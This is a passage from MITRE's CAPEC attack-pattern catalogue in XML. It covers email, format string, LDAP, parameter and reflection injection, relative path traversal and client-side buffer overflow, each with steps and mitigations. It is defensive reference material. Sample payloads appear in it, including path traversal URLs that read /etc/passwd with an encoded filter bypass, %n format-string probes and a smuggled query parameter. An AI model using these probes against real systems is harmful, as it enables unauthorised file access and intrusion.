               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-12-07">Try All Common Application Switches and Options</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="134" Name="Email Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol. Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to "share this site with a friend" where the user provides the recipient's email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an attacker adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an attacker can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must allow the user to send email to some recipient, to specify the content at least one header field in the message, and must fail to sanitize against the injection of command separators.</Prerequisite>
            <Prerequisite>The adversary must have the ability to access the target mail application.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="150"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="135" Name="Format String Injection" Abstraction="Standard" Status="Draft">
         <Description>An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey application] The adversary takes an inventory of the entry points of the application.</Description>
               <Technique>Spider web sites for all available links</Technique>
               <Technique>List parameters, external variables, configuration files variables, etc. that are possibly used by the application.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.</Description>
               <Technique>Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.</Description>
               <Technique>Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Limit the usage of formatting string functions.</Mitigation>
            <Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a "../po" directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="134"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="133"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-14"/>
            <Reference External_Reference_ID="REF-15" Section="WASC-06 - Format String"/>
            <Reference External_Reference_ID="REF-16" Section="Format String"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="136" Name="LDAP Injection" Abstraction="Standard" Status="Draft">
         <Description>An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey application] The attacker takes an inventory of the entry points of the application.</Description>
               <Technique>Spider web sites for all available links</Technique>
               <Technique>Sniff network communications with application using a utility such as WireShark.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax</Description>
               <Technique>Use web browser to inject input through text fields or through HTTP GET parameters</Technique>
               <Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</Technique>
               <Technique>Use modified client (modified by reverse engineering) to inject input.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.</Description>
               <Technique>Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.</Technique>
               <Technique>Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker needs to have knowledge of LDAP, especially its query syntax.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Authorization</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Authentication</Scope>
               <Scope>Authorization</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.</Mitigation>
            <Mitigation>Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="77"/>
            <Related_Weakness CWE_ID="90"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-17" Section="WASC-29 - LDAP Injection"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="137" Name="Parameter Injection" Abstraction="Meta" Status="Stable">
         <Description>An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&amp;). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value "myInput&amp;new_param=myValue", then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Prerequisites>
            <Prerequisite>The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.</Prerequisite>
            <Prerequisite>The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack. The only requirement is the ability to provide string input to the target.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
               <Note>Successful parameter injection attacks mean a compromise to integrity of the application.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise.</Mitigation>
            <Mitigation>Treat all user input as untrusted data that must be validated before use.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="88"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Description, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="138" Name="Reflection Injection" Abstraction="Standard" Status="Draft">
         <Description>An adversary supplies a value to the target application which is then used by reflection methods to identify a class, method, or field. For example, in the Java programming language the reflection libraries permit an application to inspect, load, and invoke classes and their components by name. If an adversary can control the input into these methods including the name of the class/method/field or the parameters passed to methods, they can cause the targeted application to invoke incorrect methods, read random fields, or even to load and utilize malicious classes that the adversary created. This can lead to the application revealing sensitive information, returning incorrect results, or even having the adversary take control of the targeted application.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="137"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target application must utilize reflection libraries and allow users to directly control the parameters to these methods. If the adversary can host classes where the target can invoke them, more powerful variants of this attack are possible.</Prerequisite>
            <Prerequisite>The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Prerequisites</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="139" Name="Relative Path Traversal" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or \) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="126"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds. He picks out the URL parameters that may related to access to files.</Description>
               <Technique>Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Attempt variations on input parameters] Possibly using an automated tool, an attacker requests variations on the identified inputs. He sends parameters that include variations of payloads.</Description>
               <Technique>Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as "../".</Technique>
               <Technique>Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Access, modify, or execute arbitrary files.] An attacker injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An attacker could be able to read directories or files which they are normally not allowed to read. The attacker could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the attacker accesses arbitrary files, he/she could also modify files. In particular situations, the attacker could also execute arbitrary code or system commands.</Description>
               <Technique>Manipulate file and its path by injecting relative path sequences (e.g. "../").</Technique>
               <Technique>Download files, modify files, or try to execute shell commands (with binary files).</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To inject the malicious payload in a web page</Skill>
            <Skill Level="High">To bypass non trivial filters in the application</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content, including remote and user-generated content.</Mitigation>
            <Mitigation>Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.</Mitigation>
            <Mitigation>Implementation: Prefer working without user input when using file system calls</Mitigation>
            <Mitigation>Implementation: Use indirect references rather than actual file names.</Mitigation>
            <Mitigation>Implementation: Use possible permissions on file access when developing and deploying web applications.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd</xhtml:div>
               <xhtml:p>However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string.</xhtml:p>
               <xhtml:p>Then an attacker creates special payloads to bypass this filter:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd</xhtml:div>
               <xhtml:p>When the application gets this input string, it will be the desired vector by the attacker.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="23"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-8" Section="Path Traversal"/>
            <Reference External_Reference_ID="REF-9" Section="Testing for Path Traversal (OWASP-AZ-001)"/>
            <Reference External_Reference_ID="REF-10" Section="WASC-33 - Path Traversal"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="14" Name="Client-side Injection-induced Buffer Overflow" Abstraction="Detailed" Status="Draft">
         <Description>This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>The attacker creates a custom hostile service</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>The attacker acquires information about the kind of client attaching to her hostile service to determine if it contains an exploitable buffer overflow vulnerability.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker intentionally feeds malicious data to the client to exploit the buffer overflow vulnerability that she has uncovered.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker leverages the exploit to execute arbitrary code or to cause a denial of service.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The targeted client software communicates with an external server.</Prerequisite>
            <Prerequisite>The targeted client software has a buffer overflow vulnerability.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a denial of service, an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>An example of indicator is when the client software crashes after executing code downloaded from a hostile server.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Resource Consumption</Impact>
               <Note>Denial of Service</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>The client software should not install untrusted code from a non-authenticated server.</Mitigation>
            <Mitigation>The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.</Mitigation>
            <Mitigation>Perform input validation for length of buffer inputs.</Mitigation>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Ensure all buffer uses are consistently bounds-checked.</Mitigation>
            <Mitigation>Use OS-level preventative functionality. Not a complete solution.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag</xhtml:div>
               <xhtml:p>Authors often use &lt;EMBED&gt; tags in HTML documents. For example</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;EMBED TYPE="audio/midi" SRC="/path/file.mid" AUTOSTART="true"&gt;</xhtml:div>
               <xhtml:p>If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="353"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="713"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="140" Name="Bypassing of Intermediate Forms in Multiple-Form Sets" Abstraction="Standard" Status="Draft">
